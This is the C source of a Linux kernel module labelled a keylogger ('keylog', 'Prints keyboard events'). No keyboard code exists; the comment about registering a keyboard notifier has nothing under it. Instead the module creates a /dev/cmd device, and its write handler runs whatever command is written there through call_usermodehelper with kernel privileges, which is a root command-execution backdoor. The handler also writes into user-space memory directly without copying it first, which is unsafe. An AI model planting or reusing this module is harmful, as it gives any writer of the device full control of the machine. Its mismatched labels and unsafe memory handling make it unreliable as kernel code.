/* keylog - Creates a device  file that outputs past keyboard input
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kdev_t.h>
#include <linux/version.h>

#include <asm/uaccess.h>

#define DEV_NAME "cmd"    // Name as it appears in /proc/devices
#define DEVICE_CNT 1
#define MAX_BUFF 512

static dev_t dev;
static struct class *cl;
static struct cdev c_dev;

static int Device_Open = 0;
char *argv[MAX_BUFF];

// Fill callback structs
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static struct file_operations fops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release,
};

/* Called when module is loaded.
 */
static int __init keylog_init(void)
{
    // Register device with kernel, major number dynamically allocated
    int res = alloc_chrdev_region(&dev, 0, DEVICE_CNT, DEV_NAME);
    if (res < 0) {
        printk(KERN_ALERT "chardev: could not register a device\n");
        return res;
    }

    // Initialize struct class
    cl = class_create(THIS_MODULE, DEV_NAME);
    if (!cl) {
        printk(KERN_ALERT "chardev: could not create class\n");
        goto error1;
    }

    // Create device and register with sysfs
    if (device_create(cl, NULL, dev, NULL, DEV_NAME) == NULL) {
        printk(KERN_ALERT "chardev: could not create device\n");
        goto error2;
    }

    // Add the device to the file system
    cdev_init(&c_dev, &fops);
    if (cdev_add(&c_dev, dev, DEVICE_CNT) < 0) {
        printk(KERN_ALERT "chardev: could not create char device on sysfs\n");
        goto error3;
    }

    // Register keyboard notifier
    return 0;
error3:
    device_destroy(cl, dev);
error2:
    class_destroy(cl);
error1:
    unregister_chrdev_region(dev, DEVICE_CNT);
    return -1;
}

/* Called when module is unloaded.
 */
static void __exit keylog_exit(void)
{
    cdev_del(&c_dev);
    device_destroy(cl, dev);
    class_destroy(cl);
    unregister_chrdev_region(dev, DEVICE_CNT);
}

/* Called when a process tries to open the device file.
 * As is "cat /dev/mycharfile"
 */
static int device_open(struct inode *inode, struct file *file)
{
    if (Device_Open)
        return -EBUSY;
    Device_Open++;

    try_module_get(THIS_MODULE);

    return 0;
}

/* Called when a process closes the device file.
 */
static int device_release(struct inode *inode, struct file *file)
{
    Device_Open--;

    module_put(THIS_MODULE);

    return 0;
}

/* Called when a process, which has opened the device file, attempts to read
 * from it.
 */
static ssize_t device_read(struct file *file_ptr, char *buffer,
                           size_t length, loff_t *offset)
{
    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
    return -EINVAL;
}

/* Called when a process tries to write to the device file.
 */
static ssize_t device_write(struct file* file_ptr, const char *buff,
                            size_t len, loff_t *off)
{
    size_t strlen = strlen_user(buff);
    char *buff_ptr = buff;
    buff_ptr[len - 1] = '\0'; // Sometimes the caller forgets to add this.
    char *token;
    int index = 0;

    // Tokenize input buffer into a command.
    token = strsep(&buff_ptr, " \n");
    while (token != NULL) {
	// Possible if multiple sequential delimiters.
	if (token[0] != '\0') 
	    argv[index++] = token;

	if (index >= MAX_BUFF - 1)
	    break;

    	token = strsep(&buff_ptr, " \n");
    }
    argv[index] = NULL;

    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return strlen;
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Christopher Chin");
MODULE_DESCRIPTION("Prints keyboard events");
